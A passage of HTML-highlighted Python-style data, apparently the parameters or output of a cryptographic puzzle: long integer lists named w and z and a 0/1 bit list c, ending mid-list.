<span class="number">1154081</span>, <span class="number">2660613</span>, <span class="number">1589095</span>, <span class="number">2143998</span>, <span class="number">1520224</span>, <span class="number">3732559</span>, <span class="number">4122336</span>, <span class="number">3906020</span>, <span class="number">2232955</span>, <span class="number">27568</span>, <span class="number">864829</span>, <span class="number">249061</span>, <span class="number">3754594</span>, <span class="number">199817</span>, <span class="number">1080629</span>, <span class="number">1688587</span>, <span class="number">3021918</span>, <span class="number">85346</span>, <span class="number">1734200</span>, <span class="number">2223663</span>, <span class="number">2357922</span>, <span class="number">724161</span>, <span class="number">3736990</span>, <span class="number">2261910</span>, <span class="number">3390396</span>, <span class="number">2948525</span>, <span class="number">1295901</span>, <span class="number">2576003</span>, <span class="number">2560019</span>, <span class="number">2746610</span>, <span class="number">2343974</span>, <span class="number">2446304</span>, <span class="number">1042150</span>, <span class="number">3500136</span>, <span class="number">213270</span>, <span class="number">2074273</span>, <span class="number">2478542</span>, <span class="number">1041559</span>, <span class="number">520262</span>, <span class="number">3893712</span>, <span class="number">3711890</span>, <span class="number">350959</span>, <span class="number">3256975</span>, <span class="number">3401444</span>, <span class="number">2398124</span>, <span class="number">3762883</span>, <span class="number">2928821</span>, <span class="number">1353277</span>, <span class="number">1128049</span>, <span class="number">1658032</span>, <span class="number">1664240</span>, <span class="number">1775167</span>, <span class="number">9320</span>, <span class="number">223085</span>, <span class="number">2964848</span>, <span class="number">3769019</span>, <span class="number">2986481</span>, <span class="number">2602091</span>, <span class="number">1867009</span>, <span class="number">2010950</span>, <span class="number">2917513</span>, <span class="number">485038</span>, <span class="number">4108141</span>, <span class="number">2758008</span>, <span class="number">3326512</span>, <span class="number">906575</span>, <span class="number">656526</span>, <span class="number">3768</span>, <span class="number">3259747</span>, <span class="number">870034</span>, <span class="number">26510</span>, <span class="number">3897304</span>, <span class="number">3776840</span>, <span class="number">2271692</span>, <span class="number">1446145</span>, <span class="number">324840</span>, <span class="number">3915722</span>, <span class="number">2938429</span>, <span class="number">831560</span>, <span class="number">1002372</span>, <span class="number">3931665</span>, <span class="number">3164196</span>, <span class="number">3900054</span>, <span class="number">1549288</span>, <span class="number">1293344</span>, <span class="number">4110122</span>, <span class="number">3378944</span>, <span class="number">3263160</span>, <span class="number">1822736</span>, <span class="number">1570556</span>, <span class="number">3585711</span>, <span class="number">3910733</span>, <span class="number">1267663</span>, <span class="number">1430694</span>, <span class="number">3074956</span>, <span class="number">2349730</span>, <span class="number">49045</span>, <span class="number">3618783</span>, <span class="number">104834</span>, <span class="number">3469400</span>, <span class="number">500062</span>, <span class="number">1027867</span>, <span class="number">1903697</span>, <span class="number">3631085</span>, <span class="number">763524</span>, <span class="number">1403697</span>, <span class="number">1000443</span>, <span class="number">3849084</span>, <span class="number">4090704</span>, <span class="number">3781938</span>, <span class="number">63386</span>, <span class="number">2161110</span>, <span class="number">3145566</span>, <span class="number">1581532</span>, <span class="number">3449870</span>, <span class="number">1828219</span>, <span class="number">4034598</span>, <span class="number">407085</span>, <span class="number">1569954</span>, <span class="number">2191973</span>, <span class="number">242689</span>, <span class="number">3151009</span>, <span class="number">533414</span>, <span class="number">3108431</span>, <span class="number">2438566</span>, <span class="number">307227</span>, <span class="number">1611173</span>, <span class="number">78926</span>, <span class="number">2467239</span>]</span><br><span class="line"></span><br><span class="line">w = [<span class="number">148126</span>, <span class="number">868354</span>, <span class="number">2143965</span>, <span class="number">1356121</span>, <span class="number">1769070</span>, <span class="number">2215173</span>, <span class="number">767953</span>, <span class="number">2601190</span>, <span class="number">1809380</span>, <span class="number">334743</span>, <span class="number">1059282</span>, <span class="number">1337866</span>, <span class="number">2591601</span>, <span class="number">4042346</span>, <span class="number">919731</span>, <span class="number">3362618</span>, <span class="number">2854566</span>, <span class="number">1414100</span>, <span class="number">2932551</span>, <span class="number">227531</span>, <span class="number">2713508</span>, <span class="number">230418</span>, <span class="number">3005563</span>, <span class="number">1760719</span>, <span class="number">536916</span>, <span class="number">1568397</span>, <span class="number">3319693</span>, <span class="number">3570057</span>, <span class="number">1863904</span>, <span class="number">1526172</span>, <span class="number">2622540</span>, <span class="number">2842511</span>, <span class="number">929697</span>, <span class="number">801598</span>, <span class="number">3805675</span>, <span class="number">3265586</span>, <span class="number">3604383</span>, <span class="number">1468136</span>, <span class="number">3999601</span>, <span class="number">2691008</span>, <span class="number">2996784</span>, <span class="number">2976853</span>, <span class="number">1437899</span>, <span class="number">2514953</span>, <span class="number">3394627</span>, <span class="number">4024905</span>, <span class="number">3227570</span>, <span class="number">3128156</span>, <span class="number">4055260</span>, <span class="number">3719706</span>, <span class="number">1875806</span>, <span class="number">2908724</span>, <span class="number">2345332</span>, <span class="number">2112583</span>, <span class="number">16315</span>, <span class="number">367194</span>, <span class="number">1605308</span>, <span class="number">2117060</span>, <span class="number">3176371</span>, <span class="number">2432272</span>, <span class="number">3045173</span>, <span class="number">3703363</span>, <span class="number">2264317</span>, <span class="number">4142685</span>, <span class="number">2318330</span>, <span class="number">4117388</span>, <span class="number">498862</span>, <span class="number">2919276</span>, <span class="number">3037612</span>, <span class="number">1891502</span>, <span class="number">3875694</span>, <span class="number">3152040</span>, <span class="number">531307</span>, <span class="number">3924428</span>, <span class="number">3655995</span>, <span class="number">4027669</span>, <span class="number">1241885</span>, <span class="number">2052122</span>, <span class="number">736953</span>, <span class="number">3689724</span>, <span class="number">503599</span>, <span class="number">1457497</span>, <span class="number">4114661</span>, <span class="number">1636903</span>, <span class="number">4191661</span>, <span class="number">324352</span>, <span class="number">3565858</span>, <span class="number">3367778</span>, <span class="number">1304255</span>, <span class="number">3849140</span>, <span class="number">4024435</span>, <span class="number">2044544</span>, <span class="number">3176857</span>, <span class="number">1576867</span>, <span class="number">2097225</span>, <span class="number">2798358</span>, <span class="number">3785400</span>, <span class="number">2709040</span>, <span class="number">3039758</span>, <span class="number">3168651</span>, <span class="number">1037116</span>, <span class="number">420753</span>, <span class="number">1312584</span>, <span class="number">3894413</span>, <span class="number">3497233</span>, <span class="number">1589033</span>, <span class="number">1636067</span>, <span class="number">3304973</span>, <span class="number">1569472</span>, <span class="number">1703302</span>, <span class="number">3337749</span>, <span class="number">1896482</span>, <span class="number">2716387</span>, <span class="number">2979425</span>, <span class="number">1057645</span>, <span class="number">2574697</span>, <span class="number">2381132</span>, <span class="number">37784</span>, <span class="number">4037898</span>, <span class="number">2235077</span>, <span class="number">1875418</span>, <span class="number">412228</span>, <span class="number">3388966</span>, <span class="number">543903</span>, <span class="number">2077344</span>, <span class="number">371740</span>, <span class="number">3730530</span>, <span class="number">4134854</span>, <span class="number">3698735</span>, <span class="number">331270</span>, <span class="number">2590936</span>, <span class="number">1907844</span>, <span class="number">2643932</span>, <span class="number">14020</span>, <span class="number">750756</span>, <span class="number">943297</span>, <span class="number">416152</span>, <span class="number">409384</span>, <span class="number">112714</span>, <span class="number">639305</span>, <span class="number">1330651</span>, <span class="number">2691724</span>, <span class="number">850667</span>, <span class="number">3224279</span>, <span class="number">58695</span>, <span class="number">1740604</span>, <span class="number">3205311</span>, <span class="number">2534600</span>, <span class="number">1928817</span>, <span class="number">1606980</span>, <span class="number">19452</span>, <span class="number">2590457</span>, <span class="number">1861232</span>, <span class="number">2738921</span>, <span class="number">1887047</span>, <span class="number">375647</span>, <span class="number">933170</span>, <span class="number">116752</span>, <span class="number">2718275</span>, <span class="number">3512157</span>, <span class="number">3274368</span>, <span class="number">1990859</span>, <span class="number">3008852</span>, <span class="number">1038390</span>, <span class="number">3471575</span>, <span class="number">3087028</span>, <span class="number">2271594</span>, <span class="number">2859626</span>, <span class="number">2959079</span>, <span class="number">3489980</span>, <span class="number">629344</span>, <span class="number">4119616</span>, <span class="number">764468</span>, <span class="number">3535051</span>, <span class="number">2466424</span>, <span class="number">2772275</span>, <span class="number">2490825</span>, <span class="number">1666917</span>, <span class="number">3042084</span>, <span class="number">4134097</span>, <span class="number">2736933</span>, <span class="number">3393706</span>, <span class="number">3600479</span>, <span class="number">2766691</span>, <span class="number">1016076</span>, <span class="number">2292766</span>, <span class="number">762445</span>, <span class="number">2425542</span>, <span class="number">2123813</span>, <span class="number">2457304</span>, <span class="number">2455905</span>, <span class="number">3084655</span>, <span class="number">2057776</span>, <span class="number">1896178</span>, <span class="number">966110</span>, <span class="number">3198662</span>, <span class="number">2499316</span>, <span class="number">3730072</span>, <span class="number">2103066</span>, <span class="number">2572639</span>, <span class="number">2952658</span>, <span class="number">402245</span>, <span class="number">1240536</span>, <span class="number">511529</span>, <span class="number">1562481</span>, <span class="number">2830782</span>, <span class="number">3625253</span>, <span class="number">2799310</span>, <span class="number">2921345</span>, <span class="number">2436157</span>, <span class="number">2891482</span>, <span class="number">4187071</span>, <span class="number">1858478</span>, <span class="number">2663235</span>, <span class="number">2407985</span>, <span class="number">4116422</span>, <span class="number">2893</span>, <span class="number">752343</span>, <span class="number">3404680</span>, <span class="number">3297905</span>, <span class="number">1980178</span>, <span class="number">3974801</span>, <span class="number">3339179</span>, <span class="number">1470992</span>, <span class="number">3549645</span>, <span class="number">769178</span>, <span class="number">2345597</span>, <span class="number">3104728</span>, <span class="number">2018656</span>, <span class="number">689899</span>, <span class="number">2165792</span>, <span class="number">1274418</span>, <span class="number">1853479</span>, <span class="number">3409514</span>, <span class="number">4086345</span>, <span class="number">389815</span>, <span class="number">2200161</span>, <span class="number">223356</span>, <span class="number">3039163</span>, <span class="number">645046</span>, <span class="number">1910260</span>, <span class="number">2370649</span>, <span class="number">2560695</span>, <span class="number">2821951</span>, <span class="number">3135761</span>, <span class="number">2983534</span>, <span class="number">1790948</span>, <span class="number">2446723</span>, <span class="number">3025904</span>, <span class="number">1195223</span>, <span class="number">1153771</span>, <span class="number">494973</span>, <span class="number">3443666</span>, <span class="number">405468</span>, <span class="number">1788872</span>, <span class="number">688372</span>]</span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">z = [[<span class="number">4197800</span>, <span class="number">4197802</span>, <span class="number">4197793</span>, <span class="number">4197793</span>, <span class="number">4197802</span>, <span class="number">4197798</span>, <span class="number">4197799</span>, <span class="number">4197802</span>, <span class="number">4197795</span>, <span class="number">4197799</span>, <span class="number">4197795</span>, <span class="number">4197799</span>, <span class="number">4197803</span>, <span class="number">4197799</span>, <span class="number">4197801</span>, <span class="number">4197796</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197796</span>, <span class="number">4197798</span>, <span class="number">4197796</span>, <span class="number">4197800</span>, <span class="number">4197794</span>, <span class="number">4197799</span>, <span class="number">4197803</span>, <span class="number">4197798</span>, <span class="number">4197804</span>, <span class="number">4197805</span>, <span class="number">4197803</span>, <span class="number">4197803</span>, <span class="number">4197800</span>, <span class="number">4197801</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197797</span>, <span class="number">4197805</span>, <span class="number">4197799</span>, <span class="number">4197800</span>, <span class="number">4197806</span>, <span class="number">4197807</span>, <span class="number">4197807</span>, <span class="number">4197807</span>, <span class="number">4197801</span>, <span class="number">4197805</span>, <span class="number">4197802</span>, <span class="number">4197799</span>, <span class="number">4197805</span>, <span class="number">4197803</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197811</span>, <span class="number">4197804</span>, <span class="number">4197799</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197812</span>, <span class="number">4197805</span>, <span class="number">4197811</span>, <span class="number">4197808</span>, <span class="number">4197809</span>, <span class="number">4197810</span>, <span class="number">4197803</span>, <span class="number">4197812</span>, <span class="number">4197806</span>, <span class="number">4197808</span>, <span class="number">4197801</span>, <span class="number">4197805</span>, <span class="number">4197809</span>, <span class="number">4197808</span>, <span class="number">4197815</span>, <span class="number">4197811</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197812</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197813</span>, <span class="number">4197811</span>, <span class="number">4197812</span>, <span class="number">4197815</span>, <span class="number">4197806</span>, <span class="number">4197807</span>, <span class="number">4197807</span>, <span class="number">4197813</span>, <span class="number">4197811</span>, <span class="number">4197803</span>, <span class="number">4197815</span>, <span class="number">4197809</span>, <span class="number">4197813</span>, <span class="number">4197806</span>, <span class="number">4197810</span>, <span class="number">4197815</span>, <span class="number">4197819</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197814</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197814</span>, <span class="number">4197811</span>, <span class="number">4197815</span>, <span class="number">4197818</span>, <span class="number">4197814</span>, <span class="number">4197815</span>, <span class="number">4197814</span>, <span class="number">4197819</span>, <span class="number">2</span>, <span class="number">4197811</span>, <span class="number">4197810</span>, <span class="number">4197817</span>, <span class="number">4197812</span>, <span class="number">4197814</span>, <span class="number">2</span>, <span class="number">4197814</span>, <span class="number">4197820</span>, <span class="number">4197815</span>, <span class="number">4197817</span>, <span class="number">4197816</span>, <span class="number">4197814</span>, <span class="number">4197815</span>, <span class="number">4197812</span>, <span class="number">4197816</span>, <span class="number">4197817</span>, <span class="number">4197820</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">4197818</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4197819</span>, <span class="number">2</span>, <span class="number">4197818</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4197819</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4197818</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">25</span>, <span class="number">23</span>, <span class="number">17</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">21</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">23</span>], [<span class="number">4197804</span>, <span class="number">4197800</span>, <span class="number">4197807</span>, <span class="number">4197795</span>, <span class="number">4197803</span>, <span class="number">4197802</span>, <span class="number">4197798</span>, <span class="number">4197803</span>, <span class="number">4197803</span>, <span class="number">4197805</span>, <span class="number">4197798</span>, <span class="number">4197798</span>, <span class="number">4197802</span>, <span class="number">4197799</span>, <span class="number">4197802</span>, <span class="number">4197798</span>, <span class="number">4197803</span>, <span class="number">4197800</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197802</span>, <span class="number">4197806</span>, <span class="number">4197804</span>, <span class="number">4197806</span>, <span class="number">4197808</span>, <span class="number">4197805</span>, <span class="number">4197807</span>, <span class="number">4197806</span>, <span class="number">4197803</span>, <span class="number">4197806</span>, <span class="number">4197810</span>, <span class="number">4197806</span>, <span class="number">4197805</span>, <span class="number">4197808</span>, <span class="number">4197805</span>, <span class="number">4197807</span>, <span class="number">4197805</span>, <span class="number">4197805</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197808</span>, <span class="number">4197809</span>, <span class="number">4197807</span>, <span class="number">4197804</span>, <span class="number">4197809</span>, <span class="number">4197811</span>, <span class="number">4197800</span>, <span class="number">4197811</span>, <span class="number">4197809</span>, <span class="number">4197803</span>, <span class="number">4197810</span>, <span class="number">4197808</span>, <span class="number">4197811</span>, <span class="number">4197802</span>, <span class="number">4197813</span>, <span class="number">4197815</span>, <span class="number">4197808</span>, <span class="number">4197807</span>, <span class="number">4197807</span>, <span class="number">4197811</span>, <span class="number">4197806</span>, <span class="number">4197800</span>, <span class="number">4197813</span>, <span class="number">4197809</span>, <span class="number">4197815</span>, <span class="number">4197806</span>, <span class="number">4197809</span>, <span class="number">4197812</span>, <span class="number">4197812</span>, <span class="number">4197807</span>, <span class="number">4197809</span>, <span class="number">4197814</span>, <span class="number">4197809</span>, <span class="number">4197806</span>, <span class="number">4197815</span>, <span class="number">4197814</span>, <span class="number">4197816</span>, <span class="number">4197808</span>, <span class="number">4197817</span>, <span class="number">4197814</span>, <span class="number">4197811</span>, <span class="number">4197812</span>, <span class="number">4197807</span>, <span class="number">4197817</span>, <span class="number">4197815</span>, <span class="number">4197815</span>, <span class="number">4197817</span>, <span class="number">4197812</span>, <span class="number">4197816</span>, <span class="number">4197810</span>, <span class="number">4197814</span>, <span class="number">4197812</span>, <span class="number">4197818</span>, <span class="number">4197809</span>, <span class="number">4197807</span>, <span class="number">4197813</span>, <span class="number">4197810</span>, <span class="number">4197816</span>, <span class="number">4197810</span>, <span class="number">4197814</span>, <span class="number">4197813</span>, <span class="number">4197815</span>, <span class="number">4197817</span>, <span class="number">4197816</span>, <span class="number">4197815</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">4197811</span>, <span class="number">4197817</span>, <span class="number">2</span>, <span class="number">4197817</span>, <span class="number">4197814</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4197814</span>, <span class="number">4197820</span>, <span class="number">4197815</span>, <span class="number">4197818</span>, <span class="number">4197819</span>, <span class="number">4197814</span>, <span class="number">4197819</span>, <span class="number">4</span>, <span class="number">4197820</span>, <span class="number">4197819</span>, <span class="number">4197815</span>, <span class="number">2</span>, <span class="number">4197819</span>, <span class="number">4197817</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4197819</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">28</span>, <span class="number">24</span>, <span class="number">27</span>, <span class="number">23</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">18</span>, <span class="number">24</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">20</span>, <span class="number">26</span>, <span class="number">21</span>], [<span class="number">4197803</span>, <span class="number">4197801</span>, <span class="number">4197803</span>, <span class="number">4197803</span>, <span class="number">4197804</span>, <span class="number">4197800</span>, <span class="number">4197802</span>, <span class="number">4197796</span>, <span class="number">4197800</span>, <span class="number">4197802</span>, <span class="number">4197802</span>, <span class="number">4197798</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197802</span>, <span class="number">4197799</span>, <span class="number">4197809</span>, <span class="number">4197807</span>, <span class="number">4197803</span>, <span class="number">4197810</span>, <span class="number">4197806</span>, <span class="number">4197809</span>, <span class="number">4197800</span>, <span class="number">4197806</span>, <span class="number">4197801</span>, <span class="number">4197801</span>, <span class="number">4197802</span>, <span class="number">4197806</span>, <span class="number">4197805</span>, <span class="number">4197806</span>, <span class="number">4197807</span>, <span class="number">4197803</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197811</span>, <span class="number">4197809</span>, <span class="number">4197809</span>, <span class="number">4197806</span>, <span class="number">4197807</span>, <span class="number">4197808</span>, <span class="number">4197806</span>, <span class="number">4197810</span>, <span class="number">4197804</span>, <span class="number">4197799</span>, <span class="number">4197810</span>, <span class="number">4197813</span>, <span class="number">4197811</span>, <span class="number">4197809</span>, <span class="number">4197808</span>, <span class="number">4197814</span>, <span class="number">4197814</span>, <span class="number">4197812</span>, <span class="number">4197813</span>, <span class="number">4197812</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197805</span>, <span class="number">4197808</span>, <span class="number">4197808</span>, <span class="number">4197812</span>, <span class="number">4197803</span>, <span class="number">4197809</span>, <span class="number">4197808</span>, <span class="number">4197816</span>, <span class="number">4197814</span>, <span class="number">4197813</span>, <span class="number">4197808</span>, <span class="number">4197813</span>, <span class="number">4197818</span>, <span class="number">4197811</span>, <span class="number">4197810</span>, <span class="number">4197816</span>, <span class="number">4197815</span>, <span class="number">4197811</span>, <span class="number">4197809</span>, <span class="number">4197812</span>, <span class="number">4197814</span>, <span class="number">4197815</span>, <span class="number">4197813</span>, <span class="number">4197811</span>, 